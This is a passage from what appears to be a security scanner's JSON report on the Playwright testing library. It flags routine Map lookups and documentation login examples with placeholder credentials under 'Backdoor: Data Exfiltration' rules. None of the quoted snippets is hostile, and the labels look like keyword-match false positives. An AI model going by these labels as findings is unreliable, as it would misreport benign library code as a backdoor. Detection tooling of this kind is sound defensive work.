                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/common/fixtures.js"
                },
                "region": {
                  "startLine": 298,
                  "startColumn": 23,
                  "endLine": 298,
                  "endColumn": 28,
                  "snippet": {
                    "text": "    registrationIdMap.set(key, map);\n  }\n  if (!map.has(registration.fn)) map.set(registration.fn, String(lastId++));\n  registration.id = map.get(registration.fn);\n  return registration.id;\n}",
                    "rendered": {
                      "text": "    registrationIdMap.set(key, map);\n  }\n  if (!map.has(registration.fn)) map.set(registration.fn, String(lastId++));\n  registration.id = map.get(registration.fn);\n  return registration.id;\n}",
                      "markdown": "`    registrationIdMap.set(key, map);\n  }\n  if (!map.has(registration.fn)) map.set(registration.fn, String(lastId++));\n  registration.id = map.get(registration.fn);\n  return registration.id;\n}`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/common/fixtures.js"
                },
                "region": {
                  "startLine": 292,
                  "startColumn": 29,
                  "endLine": 292,
                  "endColumn": 34,
                  "snippet": {
                    "text": "function registrationId(registration) {\n  if (registration.id) return registration.id;\n  const key = registration.name + '@@@' + (registration.super ? registrationId(registration.super) : '');\n  let map = registrationIdMap.get(key);\n  if (!map) {\n    map = new Map();\n    registrationIdMap.set(key, map);\n",
                    "rendered": {
                      "text": "function registrationId(registration) {\n  if (registration.id) return registration.id;\n  const key = registration.name + '@@@' + (registration.super ? registrationId(registration.super) : '');\n  let map = registrationIdMap.get(key);\n  if (!map) {\n    map = new Map();\n    registrationIdMap.set(key, map);\n",
                      "markdown": "`function registrationId(registration) {\n  if (registration.id) return registration.id;\n  const key = registration.name + '@@@' + (registration.super ? registrationId(registration.super) : '');\n  let map = registrationIdMap.get(key);\n  if (!map) {\n    map = new Map();\n    registrationIdMap.set(key, map);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/common/fixtures.js"
                },
                "region": {
                  "startLine": 195,
                  "startColumn": 30,
                  "endLine": 195,
                  "endColumn": 35,
                  "snippet": {
                    "text": "  }\n  resolve(name, forFixture) {\n    if (name === (forFixture === null || forFixture === void 0 ? void 0 : forFixture.name)) return forFixture.super;\n    return this._registrations.get(name);\n  }\n  autoFixtures() {\n    return [...this._registrations.values()].filter(r => r.auto !== false);\n",
                    "rendered": {
                      "text": "  }\n  resolve(name, forFixture) {\n    if (name === (forFixture === null || forFixture === void 0 ? void 0 : forFixture.name)) return forFixture.super;\n    return this._registrations.get(name);\n  }\n  autoFixtures() {\n    return [...this._registrations.values()].filter(r => r.auto !== false);\n",
                      "markdown": "`  }\n  resolve(name, forFixture) {\n    if (name === (forFixture === null || forFixture === void 0 ? void 0 : forFixture.name)) return forFixture.super;\n    return this._registrations.get(name);\n  }\n  autoFixtures() {\n    return [...this._registrations.values()].filter(r => r.auto !== false);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/common/fixtures.js"
                },
                "region": {
                  "startLine": 189,
                  "startColumn": 46,
                  "endLine": 189,
                  "endColumn": 51,
                  "snippet": {
                    "text": "  }\n  validateFunction(fn, prefix, location) {\n    for (const name of fixtureParameterNames(fn, location, e => this._onLoadError(e))) {\n      const registration = this._registrations.get(name);\n      if (!registration) this._addLoadError(`${prefix} has unknown parameter \"${name}\".`, location);\n    }\n  }\n",
                    "rendered": {
                      "text": "  }\n  validateFunction(fn, prefix, location) {\n    for (const name of fixtureParameterNames(fn, location, e => this._onLoadError(e))) {\n      const registration = this._registrations.get(name);\n      if (!registration) this._addLoadError(`${prefix} has unknown parameter \"${name}\".`, location);\n    }\n  }\n",
                      "markdown": "`  }\n  validateFunction(fn, prefix, location) {\n    for (const name of fixtureParameterNames(fn, location, e => this._onLoadError(e))) {\n      const registration = this._registrations.get(name);\n      if (!registration) this._addLoadError(`${prefix} has unknown parameter \"${name}\".`, location);\n    }\n  }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/common/fixtures.js"
                },
                "region": {
                  "startLine": 181,
                  "startColumn": 46,
                  "endLine": 181,
                  "endColumn": 51,
                  "snippet": {
                    "text": "    const hash = crypto.createHash('sha1');\n    const names = Array.from(this._registrations.keys()).sort();\n    for (const name of names) {\n      const registration = this._registrations.get(name);\n      visit(registration);\n      if (registration.scope === 'worker') hash.update(registration.id + ';');\n    }\n",
                    "rendered": {
                      "text": "    const hash = crypto.createHash('sha1');\n    const names = Array.from(this._registrations.keys()).sort();\n    for (const name of names) {\n      const registration = this._registrations.get(name);\n      visit(registration);\n      if (registration.scope === 'worker') hash.update(registration.id + ';');\n    }\n",
                      "markdown": "`    const hash = crypto.createHash('sha1');\n    const names = Array.from(this._registrations.keys()).sort();\n    for (const name of names) {\n      const registration = this._registrations.get(name);\n      visit(registration);\n      if (registration.scope === 'worker') hash.update(registration.id + ';');\n    }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/common/fixtures.js"
                },
                "region": {
                  "startLine": 167,
                  "startColumn": 26,
                  "endLine": 167,
                  "endColumn": 31,
                  "snippet": {
                    "text": "        }\n        if (!markers.has(dep)) {\n          visit(dep);\n        } else if (markers.get(dep) === 'visiting') {\n          const index = stack.indexOf(dep);\n          const regs = stack.slice(index, stack.length);\n          const names = regs.map(r => `\"${r.name}\"`);\n",
                    "rendered": {
                      "text": "        }\n        if (!markers.has(dep)) {\n          visit(dep);\n        } else if (markers.get(dep) === 'visiting') {\n          const index = stack.indexOf(dep);\n          const regs = stack.slice(index, stack.length);\n          const names = regs.map(r => `\"${r.name}\"`);\n",
                      "markdown": "`        }\n        if (!markers.has(dep)) {\n          visit(dep);\n        } else if (markers.get(dep) === 'visiting') {\n          const index = stack.indexOf(dep);\n          const regs = stack.slice(index, stack.length);\n          const names = regs.map(r => `\"${r.name}\"`);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/common/fixtures.js"
                },
                "region": {
                  "startLine": 84,
                  "startColumn": 42,
                  "endLine": 84,
                  "endColumn": 47,
                  "snippet": {
                    "text": "        value = value[0];\n      }\n      let fn = value;\n      const previous = this._registrations.get(name);\n      if (previous && options) {\n        if (previous.scope !== options.scope) {\n          this._addLoadError(`Fixture \"${name}\" has already been registered as a { scope: '${previous.scope}' } fixture defined in ${(0, _util.formatLocation)(previous.location)}.`, location);\n",
                    "rendered": {
                      "text": "        value = value[0];\n      }\n      let fn = value;\n      const previous = this._registrations.get(name);\n      if (previous && options) {\n        if (previous.scope !== options.scope) {\n          this._addLoadError(`Fixture \"${name}\" has already been registered as a { scope: '${previous.scope}' } fixture defined in ${(0, _util.formatLocation)(previous.location)}.`, location);\n",
                      "markdown": "`        value = value[0];\n      }\n      let fn = value;\n      const previous = this._registrations.get(name);\n      if (previous && options) {\n        if (previous.scope !== options.scope) {\n          this._addLoadError(`Fixture \"${name}\" has already been registered as a { scope: '${previous.scope}' } fixture defined in ${(0, _util.formatLocation)(previous.location)}.`, location);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/common/fixtures.js"
                },
                "region": {
                  "startLine": 12,
                  "startColumn": 233,
                  "endLine": 12,
                  "endColumn": 238,
                  "snippet": {
                    "text": "etRequireWildcardCache = function (e) { return e ? t : r; })(e); }\nfunction _interopRequireWildcard(e, r) { if (!r && e && e.__esModule) return e; if (null === e || \"object\" != typeof e && \"function\" != typeof e) return { default: e }; var t = _getRequireWildcardCache(r); if (t && t.has(e)) return t.get(e); var n = { __proto__: null }, a = Object.defineProperty && Object.getOwnPropertyDescriptor; for (var u in e) if (\"default\" !== u && Object.prototype.hasOwnProperty.call(e, u)) { var i = a ? Object.getOwnPropertyDescriptor(e, u) : null; i && (i.get || i.set) ? Object.defineProperty(n, u, i) : n[u]",
                    "rendered": {
                      "text": "etRequireWildcardCache = function (e) { return e ? t : r; })(e); }\nfunction _interopRequireWildcard(e, r) { if (!r && e && e.__esModule) return e; if (null === e || \"object\" != typeof e && \"function\" != typeof e) return { default: e }; var t = _getRequireWildcardCache(r); if (t && t.has(e)) return t.get(e); var n = { __proto__: null }, a = Object.defineProperty && Object.getOwnPropertyDescriptor; for (var u in e) if (\"default\" !== u && Object.prototype.hasOwnProperty.call(e, u)) { var i = a ? Object.getOwnPropertyDescriptor(e, u) : null; i && (i.get || i.set) ? Object.defineProperty(n, u, i) : n[u]",
                      "markdown": "`etRequireWildcardCache = function (e) { return e ? t : r; })(e); }\nfunction _interopRequireWildcard(e, r) { if (!r && e && e.__esModule) return e; if (null === e || \"object\" != typeof e && \"function\" != typeof e) return { default: e }; var t = _getRequireWildcardCache(r); if (t && t.has(e)) return t.get(e); var n = { __proto__: null }, a = Object.defineProperty && Object.getOwnPropertyDescriptor; for (var u in e) if (\"default\" !== u && Object.prototype.hasOwnProperty.call(e, u)) { var i = a ? Object.getOwnPropertyDescriptor(e, u) : null; i && (i.get || i.set) ? Object.defineProperty(n, u, i) : n[u]`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/types/test.d.ts"
                },
                "region": {
                  "startLine": 6611,
                  "startColumn": 40,
                  "endLine": 6611,
                  "endColumn": 45,
                  "snippet": {
                    "text": " *\n * test('navigates to login', async ({ page }) => {\n *   // ...\n *   const response = await page.request.get('https://playwright.dev');\n *   await expect(response).toBeOK();\n * });\n * ```\n",
                    "rendered": {
                      "text": " *\n * test('navigates to login', async ({ page }) => {\n *   // ...\n *   const response = await page.request.get('https://playwright.dev');\n *   await expect(response).toBeOK();\n * });\n * ```\n",
                      "markdown": "` *\n * test('navigates to login', async ({ page }) => {\n *   // ...\n *   const response = await page.request.get('https://playwright.dev');\n *   await expect(response).toBeOK();\n * });\n * ```\n`"
                    }
                  },
                  "sourceLanguage": "typescript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/types/test.d.ts"
                },
                "region": {
                  "startLine": 6432,
                  "startColumn": 42,
                  "endLine": 6432,
                  "endColumn": 47,
                  "snippet": {
                    "text": "   * **Usage**\n   * ```js\n   * await expect(async () => {\n   *   const response = await page.request.get('https://api.example.com');\n   *   expect(response.status()).toBe(200);\n   * }).toPass({\n   *   // Probe, wait 1s, probe, wait 2s, probe, wait 10s, probe, wait 10s, probe\n",
                    "rendered": {
                      "text": "   * **Usage**\n   * ```js\n   * await expect(async () => {\n   *   const response = await page.request.get('https://api.example.com');\n   *   expect(response.status()).toBe(200);\n   * }).toPass({\n   *   // Probe, wait 1s, probe, wait 2s, probe, wait 10s, probe, wait 10s, probe\n",
                      "markdown": "`   * **Usage**\n   * ```js\n   * await expect(async () => {\n   *   const response = await page.request.get('https://api.example.com');\n   *   expect(response.status()).toBe(200);\n   * }).toPass({\n   *   // Probe, wait 1s, probe, wait 2s, probe, wait 10s, probe, wait 10s, probe\n`"
                    }
                  },
                  "sourceLanguage": "typescript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/types/test.d.ts"
                },
                "region": {
                  "startLine": 5801,
                  "startColumn": 20,
                  "endLine": 5801,
                  "endColumn": 26,
                  "snippet": {
                    "text": "   * import { test, expect } from '@playwright/test';\n   *\n   * test('basic test', async ({ request }) => {\n   *   await request.post('/signin', {\n   *     data: {\n   *       username: 'user',\n   *       password: 'password'\n",
                    "rendered": {
                      "text": "   * import { test, expect } from '@playwright/test';\n   *\n   * test('basic test', async ({ request }) => {\n   *   await request.post('/signin', {\n   *     data: {\n   *       username: 'user',\n   *       password: 'password'\n",
                      "markdown": "`   * import { test, expect } from '@playwright/test';\n   *\n   * test('basic test', async ({ request }) => {\n   *   await request.post('/signin', {\n   *     data: {\n   *       username: 'user',\n   *       password: 'password'\n`"
                    }
                  },
                  "sourceLanguage": "typescript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/types/test.d.ts"
                },
                "region": {
                  "startLine": 5804,
                  "startColumn": 22,
                  "endLine": 5804,
                  "endColumn": 30,
                  "snippet": {
                    "text": "   *   await request.post('/signin', {\n   *     data: {\n   *       username: 'user',\n   *       password: 'password'\n   *     }\n   *   });\n   *   // ...\n",
                    "rendered": {
                      "text": "   *   await request.post('/signin', {\n   *     data: {\n   *       username: 'user',\n   *       password: 'password'\n   *     }\n   *   });\n   *   // ...\n",
                      "markdown": "`   *   await request.post('/signin', {\n   *     data: {\n   *       username: 'user',\n   *       password: 'password'\n   *     }\n   *   });\n   *   // ...\n`"
                    }
                  },
                  "sourceLanguage": "typescript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/types/test.d.ts"
                },
                "region": {
                  "startLine": 5804,
                  "startColumn": 11,
                  "endLine": 5804,
                  "endColumn": 19,
                  "snippet": {
                    "text": "   *   await request.post('/signin', {\n   *     data: {\n   *       username: 'user',\n   *       password: 'password'\n   *     }\n   *   });\n   *   // ...\n",
                    "rendered": {
                      "text": "   *   await request.post('/signin', {\n   *     data: {\n   *       username: 'user',\n   *       password: 'password'\n   *     }\n   *   });\n   *   // ...\n",
                      "markdown": "`   *   await request.post('/signin', {\n   *     data: {\n   *       username: 'user',\n   *       password: 'password'\n   *     }\n   *   });\n   *   // ...\n`"
                    }
                  },
                  "sourceLanguage": "typescript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/types/test.d.ts"
                },
                "region": {
                  "startLine": 5784,
                  "startColumn": 47,
                  "endLine": 5784,
                  "endColumn": 55,
                  "snippet": {
                    "text": "   * test('basic test', async ({ page }) => {\n   *   await page.goto('/signin');\n   *   await page.getByLabel('User Name').fill('user');\n   *   await page.getByLabel('Password').fill('password');\n   *   await page.getByText('Sign in').click();\n   *   // ...\n   * });\n",
                    "rendered": {
                      "text": "   * test('basic test', async ({ page }) => {\n   *   await page.goto('/signin');\n   *   await page.getByLabel('User Name').fill('user');\n   *   await page.getByLabel('Password').fill('password');\n   *   await page.getByText('Sign in').click();\n   *   // ...\n   * });\n",
                      "markdown": "`   * test('basic test', async ({ page }) => {\n   *   await page.goto('/signin');\n   *   await page.getByLabel('User Name').fill('user');\n   *   await page.getByLabel('Password').fill('password');\n   *   await page.getByText('Sign in').click();\n   *   // ...\n   * });\n`"
                    }
                  },
                  "sourceLanguage": "typescript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/types/test.d.ts"
                },
                "region": {
                  "startLine": 5784,
                  "startColumn": 30,
                  "endLine": 5784,
                  "endColumn": 38,
                  "snippet": {
                    "text": "   * test('basic test', async ({ page }) => {\n   *   await page.goto('/signin');\n   *   await page.getByLabel('User Name').fill('user');\n   *   await page.getByLabel('Password').fill('password');\n   *   await page.getByText('Sign in').click();\n   *   // ...\n   * });\n",
                    "rendered": {
                      "text": "   * test('basic test', async ({ page }) => {\n   *   await page.goto('/signin');\n   *   await page.getByLabel('User Name').fill('user');\n   *   await page.getByLabel('Password').fill('password');\n   *   await page.getByText('Sign in').click();\n   *   // ...\n   * });\n",
                      "markdown": "`   * test('basic test', async ({ page }) => {\n   *   await page.goto('/signin');\n   *   await page.getByLabel('User Name').fill('user');\n   *   await page.getByLabel('Password').fill('password');\n   *   await page.getByText('Sign in').click();\n   *   // ...\n   * });\n`"
                    }
                  },
                  "sourceLanguage": "typescript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/types/test.d.ts"
                },
                "region": {
                  "startLine": 5293,
                  "startColumn": 11,
                  "endLine": 5293,
                  "endColumn": 19,
                  "snippet": {
                    "text": "   *   use: {\n   *     httpCredentials: {\n   *       username: 'user',\n   *       password: 'pass',\n   *     },\n   *   },\n   * });\n",
                    "rendered": {
                      "text": "   *   use: {\n   *     httpCredentials: {\n   *       username: 'user',\n   *       password: 'pass',\n   *     },\n   *   },\n   * });\n",
                      "markdown": "`   *   use: {\n   *     httpCredentials: {\n   *       username: 'user',\n   *       password: 'pass',\n   *     },\n   *   },\n   * });\n`"
                    }
                  },
                  "sourceLanguage": "typescript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/types/test.d.ts"
                },
                "region": {
                  "startLine": 5281,
                  "startColumn": 43,
                  "endLine": 5281,
                  "endColumn": 51,
                  "snippet": {
                    "text": "  hasTouch: boolean;\n  /**\n   * Credentials for [HTTP authentication](https://developer.mozilla.org/en-US/docs/Web/HTTP/Authentication). If no\n   * origin is specified, the username and password are sent to any servers upon unauthorized responses.\n   *\n   * **Usage**\n   *\n",
                    "rendered": {
                      "text": "  hasTouch: boolean;\n  /**\n   * Credentials for [HTTP authentication](https://developer.mozilla.org/en-US/docs/Web/HTTP/Authentication). If no\n   * origin is specified, the username and password are sent to any servers upon unauthorized responses.\n   *\n   * **Usage**\n   *\n",
                      "markdown": "`  hasTouch: boolean;\n  /**\n   * Credentials for [HTTP authentication](https://developer.mozilla.org/en-US/docs/Web/HTTP/Authentication). If no\n   * origin is specified, the username and password are sent to any servers upon unauthorized responses.\n   *\n   * **Usage**\n   *\n`"
                    }
                  },
                  "sourceLanguage": "typescript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/types/test.d.ts"
                },
                "region": {
                  "startLine": 4631,
                  "startColumn": 56,
                  "endLine": 4631,
                  "endColumn": 64,
                  "snippet": {
                    "text": "   *   await test.step('login', async () => {\n   *     const account = { username: 'Alice', password: 's3cr3t' };\n   *     await page.getByLabel('Username or email address').fill(account.username);\n   *     await page.getByLabel('Password').fill(account.password);\n   *     await page.getByRole('button', { name: 'Sign in' }).click();\n   *     await expect(page.getByRole('button', { name: 'View profile and more' })).toBeVisible();\n   *   });\n",
                    "rendered": {
                      "text": "   *   await test.step('login', async () => {\n   *     const account = { username: 'Alice', password: 's3cr3t' };\n   *     await page.getByLabel('Username or email address').fill(account.username);\n   *     await page.getByLabel('Password').fill(account.password);\n   *     await page.getByRole('button', { name: 'Sign in' }).click();\n   *     await expect(page.getByRole('button', { name: 'View profile and more' })).toBeVisible();\n   *   });\n",
                      "markdown": "`   *   await test.step('login', async () => {\n   *     const account = { username: 'Alice', password: 's3cr3t' };\n   *     await page.getByLabel('Username or email address').fill(account.username);\n   *     await page.getByLabel('Password').fill(account.password);\n   *     await page.getByRole('button', { name: 'Sign in' }).click();\n   *     await expect(page.getByRole('button', { name: 'View profile and more' })).toBeVisible();\n   *   });\n`"
                    }
                  },
                  "sourceLanguage": "typescript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/types/test.d.ts"
                },
                "region": {
                  "startLine": 4631,
                  "startColumn": 32,
                  "endLine": 4631,
                  "endColumn": 40,
                  "snippet": {
                    "text": "   *   await test.step('login', async () => {\n   *     const account = { username: 'Alice', password: 's3cr3t' };\n   *     await page.getByLabel('Username or email address').fill(account.username);\n   *     await page.getByLabel('Password').fill(account.password);\n   *     await page.getByRole('button', { name: 'Sign in' }).click();\n   *     await expect(page.getByRole('button', { name: 'View profile and more' })).toBeVisible();\n   *   });\n",
                    "rendered": {
                      "text": "   *   await test.step('login', async () => {\n   *     const account = { username: 'Alice', password: 's3cr3t' };\n   *     await page.getByLabel('Username or email address').fill(account.username);\n   *     await page.getByLabel('Password').fill(account.password);\n   *     await page.getByRole('button', { name: 'Sign in' }).click();\n   *     await expect(page.getByRole('button', { name: 'View profile and more' })).toBeVisible();\n   *   });\n",
                      "markdown": "`   *   await test.step('login', async () => {\n   *     const account = { username: 'Alice', password: 's3cr3t' };\n   *     await page.getByLabel('Username or email address').fill(account.username);\n   *     await page.getByLabel('Password').fill(account.password);\n   *     await page.getByRole('button', { name: 'Sign in' }).click();\n   *     await expect(page.getByRole('button', { name: 'View profile and more' })).toBeVisible();\n   *   });\n`"
                    }
                  },
                  "sourceLanguage": "typescript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/types/test.d.ts"
                },
                "region": {
                  "startLine": 4629,
                  "startColumn": 46,
                  "endLine": 4629,
                  "endColumn": 54,
                  "snippet": {
                    "text": "   * ```js\n   * async function login(page) {\n   *   await test.step('login', async () => {\n   *     const account = { username: 'Alice', password: 's3cr3t' };\n   *     await page.getByLabel('Username or email address').fill(account.username);\n   *     await page.getByLabel('Password').fill(account.password);\n   *     await page.getByRole('button', { name: 'Sign in' }).click();\n",
                    "rendered": {
                      "text": "   * ```js\n   * async function login(page) {\n   *   await test.step('login', async () => {\n   *     const account = { username: 'Alice', password: 's3cr3t' };\n   *     await page.getByLabel('Username or email address').fill(account.username);\n   *     await page.getByLabel('Password').fill(account.password);\n   *     await page.getByRole('button', { name: 'Sign in' }).click();\n",
                      "markdown": "`   * ```js\n   * async function login(page) {\n   *   await test.step('login', async () => {\n   *     const account = { username: 'Alice', password: 's3cr3t' };\n   *     await page.getByLabel('Username or email address').fill(account.username);\n   *     await page.getByLabel('Password').fill(account.password);\n   *     await page.getByRole('button', { name: 'Sign in' }).click();\n`"
                    }
                  },
                  "sourceLanguage": "typescript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/types/test.d.ts"
                },
                "region": {
                  "startLine": 4609,
                  "startColumn": 61,
                  "endLine": 4609,
                  "endColumn": 69,
                  "snippet": {
                    "text": "   *   async login() {\n   *     const account = { username: 'Alice', password: 's3cr3t' };\n   *     await this.page.getByLabel('Username or email address').fill(account.username);\n   *     await this.page.getByLabel('Password').fill(account.password);\n   *     await this.page.getByRole('button', { name: 'Sign in' }).click();\n   *     await expect(this.page.getByRole('button', { name: 'View profile and more' })).toBeVisible();\n   *   }\n",
                    "rendered": {
                      "text": "   *   async login() {\n   *     const account = { username: 'Alice', password: 's3cr3t' };\n   *     await this.page.getByLabel('Username or email address').fill(account.username);\n   *     await this.page.getByLabel('Password').fill(account.password);\n   *     await this.page.getByRole('button', { name: 'Sign in' }).click();\n   *     await expect(this.page.getByRole('button', { name: 'View profile and more' })).toBeVisible();\n   *   }\n",
                      "markdown": "`   *   async login() {\n   *     const account = { username: 'Alice', password: 's3cr3t' };\n   *     await this.page.getByLabel('Username or email address').fill(account.username);\n   *     await this.page.getByLabel('Password').fill(account.password);\n   *     await this.page.getByRole('button', { name: 'Sign in' }).click();\n   *     await expect(this.page.getByRole('button', { name: 'View profile and more' })).toBeVisible();\n   *   }\n`"
                    }
                  },
                  "sourceLanguage": "typescript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/types/test.d.ts"
                },
                "region": {
                  "startLine": 4609,
                  "startColumn": 37,
                  "endLine": 4609,
                  "endColumn": 45,
                  "snippet": {
